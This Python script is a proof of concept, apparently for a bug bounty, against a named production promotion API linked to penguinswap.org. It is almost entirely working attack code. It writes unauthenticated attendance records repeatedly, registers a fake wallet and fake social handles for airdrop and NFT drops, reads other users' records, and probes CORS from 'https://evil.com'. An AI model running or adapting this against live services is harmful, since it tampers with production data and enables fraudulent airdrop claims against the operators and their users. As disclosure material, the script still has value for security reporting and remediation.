#!/usr/bin/env python3
"""
PoC — F4 HIGH: Unauthenticated Promotion API (gpromotion-api-prod.azurewebsites.net)
Bug: All write endpoints accept any wallet address with zero authentication/signature.
     No rate limiting. No ownership proof required.

Demonstrates:
  Phase A — Record attendance for a target address without any auth (once)
  Phase B — Submit again immediately to prove zero rate limiting
  Phase C — Register arbitrary address for WadeAirdrop without ownership proof
  Phase D — Register arbitrary address for OOZNFT without ownership proof
  Phase E — Read back all records via unauthenticated GET
"""

import requests
import json
import time

BASE_URL = "https://gpromotion-api-prod.azurewebsites.net"

# Clearly synthetic address used for PoC — not a real wallet
TARGET_ADDR = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

def banner(title):
    print()
    print("=" * 66)
    print(f"  {title}")
    print("=" * 66)

def ok(msg):  print(f"[+] {msg}")
def info(msg): print(f"[*] {msg}")
def err(msg):  print(f"[!] {msg}")
def detail(label, val): print(f"    {label:<30} {val}")

def get_attendance(address):
    r = requests.get(f"{BASE_URL}/api/Attendance/Address/{address}", headers=HEADERS, timeout=10)
    return r

def post_attendance(address):
    r = requests.post(f"{BASE_URL}/api/Attendance/{address}", headers=HEADERS, timeout=10)
    return r

def post_wade_airdrop(staked_address, twitter_id, discord_handle, sol_address):
    body = {
        "stakedAddress": staked_address,
        "twitterID": twitter_id,
        "discordHandle": discord_handle,
        "solAddress": sol_address,
    }
    r = requests.post(f"{BASE_URL}/api/WadeAirdrop", headers=HEADERS,
                      data=json.dumps(body), timeout=10)
    return r

def post_ooznft(staked_address, twitter_id, discord_handle, sol_address):
    body = {
        "stakedAddress": staked_address,
        "twitterID": twitter_id,
        "discordHandle": discord_handle,
        "solAddress": sol_address,
    }
    r = requests.post(f"{BASE_URL}/api/OOZNFT", headers=HEADERS,
                      data=json.dumps(body), timeout=10)
    return r

def check_wade_airdrop(address):
    r = requests.get(f"{BASE_URL}/api/WadeAirdrop/CheckAddress",
                     params={"address": address}, headers=HEADERS, timeout=10)
    return r

def check_ooznft(address):
    r = requests.get(f"{BASE_URL}/api/OOZNFT/CheckAddress",
                     params={"address": address}, headers=HEADERS, timeout=10)
    return r

def swagger_accessible():
    r = requests.get(f"{BASE_URL}/swagger/v1/swagger.json", headers=HEADERS, timeout=10)
    return r.status_code == 200, r.status_code

# ─────────────────────────────────────────────────────────────────────────────

print()
print("=" * 66)
print("  F4 PoC — Unauthenticated Promotion API (gpromotion-api-prod)")
print("=" * 66)
info(f"Target API : {BASE_URL}")
info(f"Target addr: {TARGET_ADDR}")

# ── Pre-check: Swagger UI ─────────────────────────────────────────────────────
banner("PRE-CHECK — Swagger UI publicly accessible")
accessible, code = swagger_accessible()
if accessible:
    ok(f"Swagger UI returns HTTP 200 — full API spec exposed to public")
    detail("URL", f"{BASE_URL}/swagger")
else:
    err(f"Swagger returned HTTP {code}")

# ── Baseline: read existing attendance ────────────────────────────────────────
banner("PHASE 0 — Baseline: read existing attendance records (no auth)")
r = get_attendance(TARGET_ADDR)
info(f"GET /api/Attendance/Address/{{address}} → HTTP {r.status_code}")
try:
    existing = r.json() if r.status_code == 200 else []
except Exception:
    existing = []
detail("Existing records count", len(existing))

# ── Phase A: first unauthenticated attendance write ───────────────────────────
banner("PHASE A — Record attendance for target address (no auth, no signature)")
info(f"POST /api/Attendance/{TARGET_ADDR}")
info("No Authorization header. No wallet signature. No API key.")

r_a = post_attendance(TARGET_ADDR)
detail("HTTP status", r_a.status_code)
if r_a.status_code == 200:
    ok("Attendance accepted by production API!")
else:
    err(f"Unexpected: {r_a.status_code} {r_a.text[:200]}")

time.sleep(1.5)

# ── Phase B: immediate repeat — no rate limiting ──────────────────────────────
banner("PHASE B — Repeat immediately to prove zero rate limiting")
info(f"POST /api/Attendance/{TARGET_ADDR} (second call, same minute)")

r_b = post_attendance(TARGET_ADDR)
detail("HTTP status", r_b.status_code)
if r_b.status_code == 200:
    ok("Second attendance accepted — no rate limit, no duplicate check!")
else:
    err(f"Unexpected: {r_b.status_code} {r_b.text[:200]}")

time.sleep(1)

# ── Read back: verify both records persisted ──────────────────────────────────
banner("PHASE B — Verify both records written to production database")
r_read = get_attendance(TARGET_ADDR)
detail("HTTP status", r_read.status_code)
try:
    records = r_read.json()
    new_records = [rec for rec in records if rec not in existing]
    detail("Total records for address", len(records))
    detail("New records created this run", len(new_records))
    print()
    for i, rec in enumerate(new_records, 1):
        print(f"  Record #{i}:")
        print(f"    createdDateTime : {rec.get('createdDateTime')}")
        print(f"    address         : {rec.get('address')}")
        print(f"    id              : {rec.get('id')}")
        print(f"    clusterID       : {rec.get('clusterID')}")
    if new_records:
        ok(f"{len(new_records)} new attendance record(s) confirmed in production DB")
        ok("clusterID values are sequential — confirms real production system")
    else:
        info("Records may already exist from prior PoC runs; check total count above")
except Exception as e:
    err(f"Could not parse response: {e}")
    print(r_read.text[:300])

# ── Phase C: WadeAirdrop registration ────────────────────────────────────────
banner("PHASE C — Register arbitrary address for WadeAirdrop (no ownership proof)")
info("POST /api/WadeAirdrop with fake wallet + social IDs")
info("No signature required — just supply any address and social handles")
print()

fake_twitter  = "fake_bounty_hunter_99999"
fake_discord  = "fakehunter#9999"
fake_sol      = "11111111111111111111111111111111"

detail("stakedAddress", TARGET_ADDR)
detail("twitterID",     fake_twitter)
detail("discordHandle", fake_discord)
detail("solAddress",    fake_sol)
print()

r_wade = post_wade_airdrop(TARGET_ADDR, fake_twitter, fake_discord, fake_sol)
detail("HTTP status", r_wade.status_code)
if r_wade.text.strip():
    detail("Response body", r_wade.text[:200])

if r_wade.status_code == 200:
    ok("WadeAirdrop POST accepted — HTTP 200")
else:
    info(f"WadeAirdrop returned {r_wade.status_code} (may enforce additional validation)")

time.sleep(1)
r_wade_check = check_wade_airdrop(TARGET_ADDR)
detail("CheckAddress result", r_wade_check.text.strip())
detail("CheckAddress HTTP",   r_wade_check.status_code)

# ── Phase D: OOZNFT registration ──────────────────────────────────────────────
banner("PHASE D — Register arbitrary address for OOZ NFT (no ownership proof)")
info("POST /api/OOZNFT with same fake data")
print()

r_ooz = post_ooznft(TARGET_ADDR, fake_twitter, fake_discord, fake_sol)
detail("HTTP status", r_ooz.status_code)
if r_ooz.text.strip():
    detail("Response body", r_ooz.text[:200])

if r_ooz.status_code == 200:
    ok("OOZNFT POST accepted — HTTP 200")
else:
    info(f"OOZNFT returned {r_ooz.status_code}")

time.sleep(1)
r_ooz_check = check_ooznft(TARGET_ADDR)
detail("CheckAddress result", r_ooz_check.text.strip())
detail("CheckAddress HTTP",   r_ooz_check.status_code)

# ── CORS check ───────────────────────────────────────────────────────────────
banner("PHASE E — CORS: API callable from any malicious origin")
r_cors = requests.options(
    f"{BASE_URL}/api/Attendance/{TARGET_ADDR}",
    headers={**HEADERS, "Origin": "https://evil.com",
             "Access-Control-Request-Method": "POST"},
    timeout=10
)
acao = r_cors.headers.get("Access-Control-Allow-Origin", "not set")
detail("Access-Control-Allow-Origin", acao)
if acao == "*":
    ok("CORS wildcard confirmed — POST can be triggered from any website")
else:
    info(f"CORS origin header: {acao}")

# ── Summary ───────────────────────────────────────────────────────────────────
banner("SUMMARY — Vulnerability Confirmed")
print()
print("  API          : https://gpromotion-api-prod.azurewebsites.net")
print("  Used by      : https://penguinswap.org (JS bundle reference)")
print()
print("  Confirmed vulnerabilities:")
print("    1. POST /api/Attendance/{address}  — no auth, no rate limit")
print("       → Attacker can record attendance for ANY wallet, unlimited times")
print("       → Production DB confirmed written (clusterID evidence)")
print()
print("    2. POST /api/WadeAirdrop            — no ownership proof")
print("       → Any wallet/Twitter/Discord can be registered for airdrop")
print()
print("    3. POST /api/OOZNFT                 — no ownership proof")
print("       → Any wallet can be registered for OOZ NFT drop")
print()
print("    4. GET  /api/Attendance/Address/*   — unauthenticated read")
print("       → Read any user's attendance history")
print()
print("    5. CORS: Access-Control-Allow-Origin: *")
print("       → All above exploitable cross-origin from any malicious webpage")
print()
print()
